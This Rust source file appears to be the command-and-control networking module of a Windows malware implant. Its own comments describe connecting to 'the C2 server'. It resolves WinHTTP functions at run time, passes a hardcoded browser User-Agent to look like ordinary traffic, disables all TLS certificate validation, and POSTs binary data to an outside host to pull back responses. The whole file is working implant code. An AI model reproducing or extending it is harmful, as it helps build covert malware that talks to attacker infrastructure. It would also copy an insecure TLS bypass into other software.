use core::ffi::c_void;

use crate::core::ssn_table;
use crate::debug;

const WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY: u32 = 4;
const WINHTTP_FLAG_SECURE: u32 = 0x00800000;
const WINHTTP_ADDREQ_FLAG_ADD: u32 = 0x20000000;
const WINHTTP_OPTION_SECURITY_FLAGS: u32 = 31;
const SECURITY_FLAG_IGNORE_ALL: u32 = 0x00003300;


type FnWinHttpOpen = unsafe extern "system" fn(
    user_agent: *const u16,   // LPCWSTR
    access_type: u32,
    proxy: *const u16,
    proxy_bypass: *const u16,
    flags: u32,
) -> *mut c_void; // HINTERNET

type FnWinHttpConnect = unsafe extern "system" fn(
    session: *mut c_void,   // HINTERNET
    server: *const u16,     // LPCWSTR
    port: u16,              // INTERNET_PORT
    reserved: u32,
) -> *mut c_void; // HINTERNET

type FnWinHttpOpenRequest = unsafe extern "system" fn(
    connect: *mut c_void,     // HINTERNET
    verb: *const u16,         // LPCWSTR
    path: *const u16,         // LPCWSTR
    version: *const u16,      // LPCWSTR
    referrer: *const u16,     // LPCWSTR
    accept_types: *const *const u16, // LPCWSTR*
    flags: u32,
) -> *mut c_void; // HINTERNET

type FnWinHttpSendRequest = unsafe extern "system" fn(
    request: *mut c_void,   // HINTERNET
    headers: *const u16,    // LPCWSTR
    headers_len: u32,       // DWORD (-1 for auto)
    body: *const c_void,    // LPVOID
    body_len: u32,
    total_len: u32,
    context: usize,
) -> i32; // BOOL

type FnWinHttpReceiveResponse = unsafe extern "system" fn(
    request: *mut c_void,
    reserved: *mut c_void,
) -> i32; // BOOL

type FnWinHttpQueryDataAvailable = unsafe extern "system" fn(
    request: *mut c_void,
    bytes_available: *mut u32,
) -> i32; // BOOL

type FnWinHttpReadData = unsafe extern "system" fn(
    request: *mut c_void,
    buffer: *mut c_void,
    bytes_to_read: u32,
    bytes_read: *mut u32,
) -> i32; // BOOL

type FnWinHttpSetOption = unsafe extern "system" fn(
    handle: *mut c_void,
    option: u32,
    buffer: *const c_void,
    buffer_len: u32,
) -> i32; // BOOL

type FnWinHttpCloseHandle = unsafe extern "system" fn(
    handle: *mut c_void,
) -> i32; // BOOL

type FnWinHttpAddRequestHeaders = unsafe extern "system" fn(
    request: *mut c_void,
    headers: *const u16,
    headers_len: u32,
    modifiers: u32,
) -> i32; // BOOL


pub struct HttpSession {
    session_handle: *mut c_void,
    connect_handle: *mut c_void,
    use_https: bool,
}

impl HttpSession {
    /**
     * Create a new HTTP session connected to the C2 server
     * */
    pub unsafe fn new(host: &[u16], port: u16, use_https: bool) -> Option<Self> {
        let table = ssn_table::syscall_table();

        if table.win32.winhttp_open.is_null() || table.win32.winhttp_connect.is_null(){
            debug!("[NET] WinHTTP functions are not resolved");
            return None;
        }

        // User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        let user_agent: [u16; 72] = [
            0x004D, 0x006F, 0x007A, 0x0069, 0x006C, 0x006C, 0x0061, 0x002F, // Mozilla/
            0x0035, 0x002E, 0x0030, 0x0020, 0x0028, 0x0057, 0x0069, 0x006E, // 5.0 (Win
            0x0064, 0x006F, 0x0077, 0x0073, 0x0020, 0x004E, 0x0054, 0x0020, // dows NT
            0x0031, 0x0030, 0x002E, 0x0030, 0x003B, 0x0020, 0x0057, 0x0069, // 10.0; Wi
            0x006E, 0x0036, 0x0034, 0x003B, 0x0020, 0x0078, 0x0036, 0x0034, // n64; x64
            0x0029, 0x0020, 0x0041, 0x0070, 0x0070, 0x006C, 0x0065, 0x0057, // ) AppleW
            0x0065, 0x0062, 0x004B, 0x0069, 0x0074, 0x002F, 0x0035, 0x0033, // ebKit/53
            0x0037, 0x002E, 0x0033, 0x0036, 0x0020, 0x0028, 0x004B, 0x0048, // 7.36 (KH
            0x0054, 0x004D, 0x004C, 0x0029, 0x0000, 0x0000, 0x0000, 0x0000, // TML)\0
        ];

        let open_fn: FnWinHttpOpen = core::mem::transmute(table.win32.winhttp_open);
        let session_handle = open_fn(
            user_agent.as_ptr(),
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
            core::ptr::null(),
            core::ptr::null(),
            0, // synchronous
        );

        if session_handle.is_null() {
            debug!("[NET] WinHttpOpen failed");
            return None;
        }

        let connect_fn: FnWinHttpConnect = core::mem::transmute(table.win32.winhttp_connect);
        let connect_handle = connect_fn(
            session_handle,
            host.as_ptr(),
            port,
            0,
        );

        if connect_handle.is_null() {
            debug!("[NET] WinHttpConnect failed");
            let close_fn: FnWinHttpCloseHandle = core::mem::transmute(table.win32.winhttp_close_handle);
            close_fn(session_handle);
            return None;
        }

        debug!("[NET] HTTP session established (HTTPS={})", use_https);
        Some(HttpSession{session_handle, connect_handle, use_https})
    }

    /**
     * Send and HTTP POST request with binary body and return the response body
     * */
    pub unsafe fn post(&self, path: &[u16], body: &[u8]) -> Option<Vec<u8>> {
        let table = ssn_table::syscall_table();

        // POST verb in UTF-16
        let verb: [u16; 5] = [0x0050, 0x004F, 0x0053, 0x0054, 0x0000]; // POST\0
        let flags = if self.use_https { WINHTTP_FLAG_SECURE } else { 0 };

        let open_req_fn: FnWinHttpOpenRequest = core::mem::transmute(table.win32.winhttp_open_request);
        let request = open_req_fn(
            self.connect_handle,
            verb.as_ptr(),
            path.as_ptr(),
            core::ptr::null(),  // HTTP/1.1 default
            core::ptr::null(),  // no referrer
            core::ptr::null(),  // accept all
            flags,
        );

        if request.is_null() {
            debug!("[NET] WinHttpOpenRequest failed");
            return None;
        }

        // for HTTPS with self signed certs: ignore validation errors
        if self.use_https && !table.win32.winhttp_set_option.is_null() {
            let set_opt_fn: FnWinHttpSetOption = core::mem::transmute(table.win32.winhttp_set_option);
            let sec_flags = SECURITY_FLAG_IGNORE_ALL;
            set_opt_fn(
                request,
                WINHTTP_OPTION_SECURITY_FLAGS,
                &sec_flags as *const _ as *const c_void,
                4,
            );
        }

        // Add Contenct type header: application/octet-stream
        if !table.win32.winhttp_add_request_headers.is_null() {
            let add_hdr_fn: FnWinHttpAddRequestHeaders = core::mem::transmute(table.win32.winhttp_add_request_headers);
            // "Content-Type: application/octet-stream\r\n"
            let content_type: [u16; 41] = [
                0x0043, 0x006F, 0x006E, 0x0074, 0x0065, 0x006E, 0x0074, 0x002D, // Content-
                0x0054, 0x0079, 0x0070, 0x0065, 0x003A, 0x0020, 0x0061, 0x0070, // Type: ap
                0x0070, 0x006C, 0x0069, 0x0063, 0x0061, 0x0074, 0x0069, 0x006F, // plicatio
                0x006E, 0x002F, 0x006F, 0x0063, 0x0074, 0x0065, 0x0074, 0x002D, // n/octet-
                0x0073, 0x0074, 0x0072, 0x0065, 0x0061, 0x006D, 0x000D, 0x000A, // stream\r\n
                0x0000,
            ];

            add_hdr_fn(
                request,
                content_type.as_ptr(),
                0xFFFFFFFF,
                WINHTTP_ADDREQ_FLAG_ADD
            );

            // "Accept: */*\r\n"
            let accept: [u16; 14] = [
                0x0041, 0x0063, 0x0063, 0x0065, 0x0070, 0x0074, 0x003A, 0x0020, // Accept:
                0x002A, 0x002F, 0x002A, 0x000D, 0x000A, 0x0000,                 // */*\r\n\0
            ];
            add_hdr_fn(
                request, 
                accept.as_ptr(), 
                0xFFFFFFFF, 
                WINHTTP_ADDREQ_FLAG_ADD
            );
        }

        // Send the request
        let send_fn: FnWinHttpSendRequest = core::mem::transmute(table.win32.winhttp_send_request);
        let send_ok = send_fn(
            request,
            core::ptr::null(), // no additional headers
            0,
            body.as_ptr() as *const c_void,
            body.len() as u32,
            body.len() as u32,
            0
        );

        if send_ok == 0 {
            debug!("[NET] WinHttpSendRequest failed");
            let close_fn: FnWinHttpCloseHandle = core::mem::transmute(table.win32.winhttp_close_handle);
            close_fn(request);
            return None;
        }

        // Receive reqsponse
        let recv_fn: FnWinHttpReceiveResponse = core::mem::transmute(table.win32.winhttp_receive_response);
        let recv_ok = recv_fn(request, core::ptr::null_mut());

        if recv_ok == 0 {
            debug!("[NET] WinHttpReceiveResponse failed");
            let close_fn: FnWinHttpCloseHandle = core::mem::transmute(table.win32.winhttp_close_handle);
            close_fn(request);
            return None;
        }

        // Read response body
        let response = self.read_response(request);

        let close_fn: FnWinHttpCloseHandle = core::mem::transmute(table.win32.winhttp_close_handle);
        close_fn(request);

        response
    }

    /**
     * Read the full response body from a WinHTTP request handle
     * */
    unsafe fn read_response(&self, request: *mut c_void) -> Option<Vec<u8>> {
        let table = ssn_table::syscall_table();

        if table.win32.winhttp_query_data_available.is_null() || table.win32.winhttp_read_data.is_null() {
            return  None;            
        }

        let query_fn: FnWinHttpQueryDataAvailable = core::mem::transmute(table.win32.winhttp_query_data_available);
        let read_fn: FnWinHttpReadData = core::mem::transmute(table.win32.winhttp_read_data);

        let mut result: Vec<u8> = Vec::new();
        let mut buf = [0u8; 4096];

        loop {
            let mut available: u32 = 0;
            if query_fn(request, &mut available) == 0 {
                break;
            }
            if available == 0 {
                break;
            }

            let to_read = if available > 4096 { 4096 } else { available };
            let mut bytes_read: u32 = 0;

            if read_fn(
                request,
                buf.as_mut_ptr() as *mut c_void,
                to_read,
                &mut bytes_read
            ) == 0 {
                break;
            }

            if bytes_read == 0 {
                break;
            }

            result.extend_from_slice(&buf[..bytes_read as usize]);
        }

        if result.is_empty() {
            None
        } else {
            Some(result)
        }
    }
}
